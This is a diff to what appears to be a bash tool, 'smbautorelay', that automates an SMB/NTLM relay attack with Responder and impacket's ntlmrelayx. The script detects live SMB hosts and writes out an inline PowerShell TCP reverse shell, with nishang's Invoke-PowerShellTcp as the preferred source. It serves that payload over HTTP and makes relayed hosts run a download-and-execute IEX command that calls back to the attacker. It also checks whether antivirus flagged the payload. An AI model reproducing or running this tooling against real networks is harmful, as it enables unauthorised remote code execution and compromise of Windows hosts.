@@ -88,17 +88,17 @@ function checkApt(){
 	if [ "$1" == "net-tools" ];then which ifconfig &>/dev/null; else which $1 &>/dev/null; fi
 
 	if [ $? -eq 0 ];then
-		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} $1 installed\n";sleep 0.5; fi
+		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} $1 installed\n";sleep 0.3; fi
 	else
-		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} $1 not installed, installing..."; sleep 0.5; fi
+		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} $1 not installed, installing..."; sleep 0.3; fi
 
 		apt install -y $1 &>/dev/null
 		if [ "$1" == "net-tools" ];then which ifconfig &>/dev/null; else which $1 &>/dev/null; fi
 		if [ $? -eq 0 ];then
-			if [ ! -z $quiet ]; then echo -e "\t${greenColour}[:)]${endColour} $1 installed\n"; sleep 0.5; fi
+			if [ ! -z $quiet ]; then echo -e "\t${greenColour}[:)]${endColour} $1 installed\n"; sleep 0.3; fi
 			echo "$1" >> $(pwd)/uninstall.txt
 		else
-			echo -e "\t${redColour}[D:]${endColour} Something bad happened, $1 could not be installed. Try installing manually and run me again\n"; sleep 0.5; badExit
+			echo -e "\t${redColour}[D:]${endColour} Something bad happened, $1 could not be installed. Try installing manually and run me again\n"; sleep 0.3; badExit
 		fi
 	fi
 
@@ -107,7 +107,7 @@ function checkApt(){
 function makeBck(){
 
 	if [ ! -e "$(pwd)/responder/Responder.conf.old" ];then
-		if [ ! -z $quiet ];then echo -e "\t${blueColour}[:*]${endColour} Making copy of '$(pwd)/responder/Responder.conf' to '$(pwd)/responder/Responder.conf.old'\n"; sleep 0.5; fi
+		if [ ! -z $quiet ];then echo -e "\t${blueColour}[:*]${endColour} Making copy of '$(pwd)/responder/Responder.conf' to '$(pwd)/responder/Responder.conf.old'\n"; sleep 0.3; fi
 		cp $(pwd)/responder/Responder.conf $(pwd)/responder/Responder.conf.old
 	fi
 
@@ -115,39 +115,39 @@ function makeBck(){
 
 function checkProgramsNeeded(){
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Updating apt...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Updating apt...\n"; sleep 0.3; fi
 	apt update &>/dev/null
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking for dependencies needed...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking for dependencies needed...\n"; sleep 0.3; fi
 
 	programs=(tmux rlwrap python3 netcat wget xterm net-tools)
 	for program in "${programs[@]}"; do checkApt $program; done
 
-	python3 $(pwd)/responder/Responder.py -h &>/dev/null
+	python $(pwd)/responder/Responder.py -h &>/dev/null
     	if [ $? -eq 0 ];then
-        	if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} responder installed\n"; sleep 0.5; fi
+        	if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} responder installed\n"; sleep 0.3; fi
         	makeBck
 	else
-		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} responder not installed, installing at '$(pwd)/responder' directory";sleep 0.5; fi
+		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} responder not installed, installing at '$(pwd)/responder' directory";sleep 0.3; fi
 
         if [ -e $(pwd)/responder ];then rm -rf $(pwd)/responder &>/dev/null; fi
 
-		mkdir $(pwd)/responder; git clone https://github.com/lgandx/Responder.git $(pwd)/responder &>/dev/null
+		mkdir $(pwd)/responder; git clone https://github.com/SpiderLabs/Responder.git $(pwd)/responder &>/dev/null
 		test -f $(pwd)/responder/Responder.py &>/dev/null
       		if [ $? -eq 0 ]; then
 			chmod u+x $(pwd)/responder/Responder.py
-			if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} responder installed\n"; sleep 0.5; fi
+			if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} responder installed\n"; sleep 0.3; fi
         			makeBck; echo "responder" >> $(pwd)/uninstall.txt
 		else
-			echo -e "\t${redColour}[D:]${endColour} Something bad happened, responder could not be installed. Try installing manually at '$(pwd)/responder' directory and run me again\n"; sleep 0.5; badExit
+			echo -e "\t${redColour}[D:]${endColour} Something bad happened, responder could not be installed. Try installing manually at '$(pwd)/responder' directory and run me again\n"; sleep 0.3; badExit
 		fi
 	fi
 
 	python3 $(pwd)/impacket/ntlmrelayx.py -h &>/dev/null
 	if [ $? -eq 0 ];then
-		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} impacket installed\n";sleep 0.5; fi
+		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} impacket installed\n";sleep 0.3; fi
 	else
-		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} impacket not installed, installing at '$(pwd)/impacket' directory"; sleep 0.5; fi
+		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} impacket not installed, installing at '$(pwd)/impacket' directory"; sleep 0.3; fi
 		
         	if [ -e $(pwd)/impacket ];then rm -rf $(pwd)/impacket &>/dev/null; fi
 
@@ -158,10 +158,10 @@ function checkProgramsNeeded(){
 		if [ $? -eq 0 ];then
 			cp $(pwd)/impacket/examples/ntlmrelayx.py $(pwd)/impacket/ntlmrelayx.py
 			chmod u+x $(pwd)/impacket/ntlmrelayx.py
-			if [ ! -z $quiet  ]; then echo -e "\t${greenColour}[:)]${endColour} impacket installed\n"; sleep 0.5; fi
+			if [ ! -z $quiet  ]; then echo -e "\t${greenColour}[:)]${endColour} impacket installed\n"; sleep 0.3; fi
 			echo "impacket" >> uninstall.txt
 		else
-			echo -e "\t${redColour}[:S]${endColour} Something bad happened, impacket could not be installed. Try installing manually at '$(pwd)/impacket' directory and run me again\n"; sleep 0.5; badExit
+			echo -e "\t${redColour}[:S]${endColour} Something bad happened, impacket could not be installed. Try installing manually at '$(pwd)/impacket' directory and run me again\n"; sleep 0.3; badExit
 		fi
 	fi
 
@@ -187,13 +187,13 @@ function checkTargets(){
 	
 	checkDependency "ntlmrelayx.py"
 	
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking targets...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking targets...\n"; sleep 0.3; fi
 	
 	if [ -e $(pwd)/impacket/targets.txt ];then rm -f $(pwd)/impacket/targets.txt &>/dev/null; fi
 
 	while read line; do 
 		nc -nvzq 1 $line 445 &>/dev/null; if [ $? -ne 0 ];then
-			if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} Target $line is not alive or has the SMB service disable.\n"; sleep 0.5; fi
+			if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} Target $line is not alive or has the SMB service disable.\n"; sleep 0.3; fi
 		else
 			echo $line >> $(pwd)/impacket/targets.txt
 		fi
@@ -202,7 +202,7 @@ function checkTargets(){
 	if [ ! -e $(pwd)/impacket/targets.txt ];then echo -e "${redColour}[D:]${endColour} No targets available to perform the relaying\n"; badExit; fi
 
 	cat $(pwd)/impacket/targets.txt | sort -u > $(pwd)/targets.tmp
-	cp $(pwd)/targets.tmp $(pwd)/impacket/targets.txt
+	mv $(pwd)/targets.tmp $(pwd)/impacket/targets.txt
 
 }
 
@@ -222,7 +222,7 @@ function checkResponderConfig(){
 	fi
 
 	if [ "$SMBStatus" == "On" ]; then
-		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} Responder SMB server enabled, switching off..."; sleep 0.5; fi
+		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} Responder SMB server enabled, switching off..."; sleep 0.3; fi
 		
 		sed 's/SMB = On/SMB = Off/' $(pwd)/responder/Responder.conf > $(pwd)/responder/Responder.conf.tmp
 		mv $(pwd)/responder/Responder.conf.tmp $(pwd)/responder/Responder.conf
@@ -230,7 +230,7 @@ function checkResponderConfig(){
 	fi
 
 	if [ "$HTTPStatus" == "On" ]; then
-		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} Responder HTTP server enabled, switching off..."; sleep 0.5; fi
+		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} Responder HTTP server enabled, switching off..."; sleep 0.3; fi
 		
 		which $(pwd)/responder/Responder.conf.tmp &>/dev/null
 		sed 's/HTTP = On/HTTP = Off/' $(pwd)/responder/Responder.conf > $(pwd)/responder/Responder.conf.tmp
@@ -239,7 +239,7 @@ function checkResponderConfig(){
 	fi
 
 	if [[ $HTTPStatus == "Off" && $SMBStatus == "Off" ]];then if [ ! -z $quiet ];then echo -ne "\n"; fi; fi
-	if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} Responder SMB and HTTP servers disabled. Starting Relay Attack...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} Responder SMB and HTTP servers disabled. Starting Relay Attack...\n"; sleep 0.3; fi
 	
 }
 
@@ -248,31 +248,34 @@ function bTmux(){
 	echo -e "${redColour}[D:]${endColour} Tmux blew up... That hurts! Try running me again\n"; badExit
 }
 
+function updateNtlmRelayxLog(){
+
+	while (true);do
+		tmux capture-pane -p -S - > $(pwd)/impacket/ntlmrelayx.log
+		if [ $? -ne 0 ];then bTmux; fi
+	done
+
+}
+
 function targetStatus(){
 
-	sleep 2
+	status=$(grep 'Authenticating against smb://'$1 $(pwd)/impacket/ntlmrelayx.log | tail -1 | awk '{print $NF}')
 
-	tmux capture-pane -p -S - > $(pwd)/impacket/ntlmrelayx.log
-	if [ $? -ne 0 ];then bTmux; fi
-
-	status=$(grep 'Authenticating against smb://'$1 $(pwd)/impacket/ntlmrelayx.log | sort -u | awk '{print $NF}')
-	
-	if [ "$status" == "SUCCEE" ];then
+	if [[ "$status" == "SUCCEED" || "$status" == "SUCCEE" ]];then
+		echo -e "\t${greenColour}[:)]${endColour} Authentication against $1 succeed! Dropping the payload..."; 
+		if [ "$(grep 'ScriptContainedMaliciousContent' $(pwd)/impacket/ntlmrelayx.log)" == "" ];then sleep 5; fi
 
 		check=$(grep "Executed specified command on host: $1" -A11 $(pwd)/impacket/ntlmrelayx.log | tail -1 | awk '{print $4}' | cut -d',' -f1)
 		check2=$(grep "Executed specified command on host: $1" -A12 $(pwd)/impacket/ntlmrelayx.log | tail -1 | awk '{print $4}' | cut -d',' -f1)
 		if [[ "$check" == "ScriptContainedMaliciousContent" || "$check2" == "ScriptContainedMaliciousContent" ]];then 
-			echo -e "\t${greenColour}[:)]${endColour} Authentication against $1 succeed! Dropping the payload..."; sleep 2
-			echo -e "\t${redColour}[D:]${endColour} Bad news! Host AV flagged our payload\n"
+			echo -e "\t${redColour}[D:]${endColour} Bad news! Host AV flagged the payload\n"
 			echo $1 >> $(pwd)/impacket/hostsStatus.tmp
-		else	
-			echo -e "\t${greenColour}[:)]${endColour} Authentication against $1 succeed! Dropping the payload..."; sleep 2
-		fi
-
-	fi
-
-	if [ "$status" == "FAILED" ];then
-		echo -e "\t${redColour}[:(]${endColour} Authentication against $1 failed!\n"; sleep 2
+		elif [ "$(netstat -tnualp | grep '/nc' | grep "ESTABLISHED" | grep "$1")" == "" ];then 
+			echo -e "\t${redColour}[:(]${endColour} Unable to execute the payload.\n"
+			echo $1 >> $(pwd)/impacket/hostsStatus.tmp
+		else echo; fi
+	elif [ "$status" == "FAILED" ];then
+		echo -e "\t${redColour}[:(]${endColour} Authentication against $1 failed!\n"; sleep 0.3
 		echo $1 >> $(pwd)/impacket/hostsStatus.tmp
 	fi
 
@@ -282,27 +285,27 @@ function relayingAttack(){
 
    	checkDependency "tmux"
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Starting Tmux server...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Starting Tmux server...\n"; sleep 0.3; fi
 	tmux start-server &>/dev/null
-	if [ $? -ne 0 ];then bTmux else sleep 2; fi
+	if [ $? -ne 0 ];then bTmux else sleep 1; fi
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Creating Tmux session 'smbautorelay'...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Creating Tmux session 'smbautorelay'...\n"; sleep 0.3; fi
 	tmux new-session -d -t "smbautorelay" &>/dev/null
-	if [ $? -ne 0 ];then bTmux; else sleep 0.5; fi
+	if [ $? -ne 0 ];then bTmux; else sleep 0.3; fi
 
 	tmux rename-window "smbautorelay" &>/dev/null && tmux split-window -h &>/dev/null
-	if [ $? -ne 0 ];then bTmux; else sleep 0.5; fi
+	if [ $? -ne 0 ];then bTmux; else sleep 0.3; fi
 
 	paneID=0; tmux select-pane -t $paneID > /dev/null 2>&1
 	if [ $? -ne 0 ];then 
 		let paneID+=1; tmux select-pane -t $paneID > /dev/null 2>&1
-		if [ $? -ne 0 ];then bTmux; else sleep 0.5; fi
+		if [ $? -ne 0 ];then bTmux; else sleep 0.3; fi
 	fi
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Tmux setted up. Launching responder...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Tmux setted up. Launching responder...\n"; sleep 0.3; fi
 
-	tmux send-keys "python3 $(pwd)/responder/Responder.py -I $interface -drw" C-m &>/dev/null && tmux swap-pane -d &>/dev/null 
-	if [ $? -ne 0 ];then bTmux; else sleep 1; fi
+	tmux send-keys "python $(pwd)/responder/Responder.py -I $interface -drw" C-m &>/dev/null && tmux swap-pane -d &>/dev/null 
+	if [ $? -ne 0 ];then bTmux; else sleep 0.3; fi
 
     	checkDependency "net-tools"
 
@@ -312,33 +315,33 @@ function relayingAttack(){
 		lport=$(($RANDOM%65535)); if [ $lport -ne $openPort ];then break; fi
 	done
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Downloading PowerShell payload from nishang repository...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Downloading PowerShell payload from nishang repository...\n"; sleep 0.3; fi
 
 	checkDependency "wget"
 
 	wget 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1' -O $(pwd)/shell.ps1 &>/dev/null
 	if [ ! -e "$(pwd)/shell.ps1" ];then
-		if [ ! -z $quiet ];then echo -e "${yellowColour}[:S]${endColour} Unable to get nishang payload. Let's try crafting it manually...\n"; sleep 0.5; fi
+		if [ ! -z $quiet ];then echo -e "${yellowColour}[:S]${endColour} Unable to get nishang payload. Let's try crafting it manually...\n"; sleep 0.3; fi
 		rshell='$client = New-Object System.Net.Sockets.TCPClient("'$lhost'",'$lport');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 		echo $rshell > $(pwd)/shell.ps1
 	else
 		echo 'Invoke-PowerShellTcp -Reverse -IPAddress '$lhost' -Port '$lport >> $(pwd)/shell.ps1
 	fi
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Serving PowerShell payload at $lhost:8000...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Serving PowerShell payload at $lhost:8000...\n"; sleep 0.3; fi
 
-	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys "python3 -m http.server" C-m &>/dev/null && sleep 1 && tmux split-window &>/dev/null
-	if [ $? -ne 0 ];then bTmux; else sleep 0.5; fi
+	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys "python3 -m http.server" C-m &>/dev/null && tmux split-window &>/dev/null
+	if [ $? -ne 0 ];then bTmux; else sleep 0.3; fi
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.3; fi
 
 	python3 $(pwd)/ntlmrelayx.py -h &>/dev/null
 	if [ $? -ne 0 ];then python3 -m pip install -q impacket &>/dev/null; fi
 
 	command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
 	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys -t $paneID "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\"" C-m &>/dev/null
-	if [ $? -ne 0 ];then bTmux; else sleep 1; fi
+	if [ $? -ne 0 ];then bTmux; fi
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} port $lport open to receive the connection\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} port $lport open to receive the connection\n"; sleep 0.3; fi
 
 	terminal='xterm'
 	for ps in $(ps ax | awk '{print $5}' | sort -u | grep -v "\[\|\/" | awk -F- '{print $1}'); do
@@ -357,9 +360,9 @@ function relayingAttack(){
 	fi
 	terminal_nc_PID=$!
 	
-    	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to locate terminal in the system. Existing...\n"; badExit; else echo -e "${blueColour}[:*]${endColour} Relay attack deployed, waiting for LLMNR/NTB-NS request...\n"; sleep 3; fi
+    	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to locate terminal in the system. Existing...\n"; badExit; else echo -e "${blueColour}[:*]${endColour} Relay attack deployed, waiting for LLMNR/NBT-NS request...\n"; fi
 
-	portStatus=$(netstat -tunalp | grep $lport | awk '{print $6}' | sort -u)
+	portStatus='LISTEN'
 
 	touch $(pwd)/impacket/hostsStatus.tmp &>/dev/null
 	
@@ -368,15 +371,18 @@ function relayingAttack(){
 			echo -e "\t${yellowColour}[-.-]${endColour} You already have a shell at $line! Please do not bully and remove it from targets.\n"
 			echo $line >> $(pwd)/impacket/hostsStatus.tmp
 		fi
-	done < $targets
+	done < $(pwd)/impacket/targets.txt
 
-	tmux resize-pane -Z -L 8
+	tmux resize-pane -Z -L 8 &>/dev/null
 	if [ $? -ne 0 ];then bTmux; fi
 	
+	updateNtlmRelayxLog &>/dev/null &
+	updateNtlmRelayxLog=$!
+
 	while [ "$portStatus" == "LISTEN" ];do
 		while read line; do
-				if [[ "$(grep $line $(pwd)/impacket/hostsStatus.tmp)" == '' && "$portStatus" == "LISTEN" ]];then targetStatus "$line";	fi
-		done < $targets
+				if [ "$(grep $line $(pwd)/impacket/hostsStatus.tmp)" == '' ];then targetStatus "$line";	fi
+		done < $(pwd)/impacket/targets.txt
 
 		if [[ "$(wc -l $(pwd)/impacket/hostsStatus.tmp | awk '{print $1}')" == "$(wc -l $(pwd)/impacket/targets.txt | awk '{print $1}')" ]];then
 			echo -e "${redColour}[:(]${endColour} No targets left to perform the relay\n"; badExit
@@ -390,13 +396,16 @@ function relayingAttack(){
 	while read line; do if [ "$rhost" == "$line" ];then checkrhost=1; fi; done < $targets
 
 	if [[ "$portStatus" == "ESTABLISHED" && $checkrhost -eq 1 ]];then
-		echo -e "\n${greenColour}[:D]${endColour} Relaying against $rhost successful! Enjoy your shell!\n"; sleep 0.5
+		echo -e "${greenColour}[:D]${endColour} Relaying against $rhost successful! Enjoy your shell!\n"; sleep 0.3
 	else
-		echo -e "${redColour}[:(]${endColour} Relay unsuccessful! May be you need more coffee\n"; sleep 0.5
+		echo -e "${redColour}[:(]${endColour} Relay unsuccessful! May be you need more coffee\n"; sleep 0.3
 	fi
+
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Killing Tmux session 'smbautorelay'\n"; sleep 0.3; fi
 	
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Killing Tmux session 'smbautorelay'\n"; sleep 0.5; fi
-	
+	kill -9 $updateNtlmRelayxLog &>/dev/null
+	wait $updateNtlmRelayxLog &>/dev/null
+
 	goodExit
 
 }
@@ -412,7 +421,7 @@ function rmsw(){
 	done
 
 	if [ "$confirm" == "y" ];then 
-		echo -e "\n$yellowColour[:!]${endColour} Uninstalling process started, please do not stop the process...\n"; sleep 0.5
+		echo -e "\n$yellowColour[:!]${endColour} Uninstalling process started, please do not stop the process...\n"; sleep 0.3
 
 		while read line; do
 			if [[ ${line:0:1} != '#' && "$line" != '' ]];then
@@ -426,9 +435,9 @@ function rmsw(){
 				fi
 				
 				if [ $? -ne 0 ];then
-					if [ ! -z $quiet ];then echo -e "\t${redColour}[D:]${endColour} Unable to uninstall $line. Try to do it manually\n"; sleep 0.5; fi
+					if [ ! -z $quiet ];then echo -e "\t${redColour}[D:]${endColour} Unable to uninstall $line. Try to do it manually\n"; sleep 0.3; fi
 				else
-					if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} $line uninstaled\n"; sleep 0.5; fi
+					if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} $line uninstaled\n"; sleep 0.3; fi
 				fi
 			fi
 		done < $(pwd)/uninstall.txt
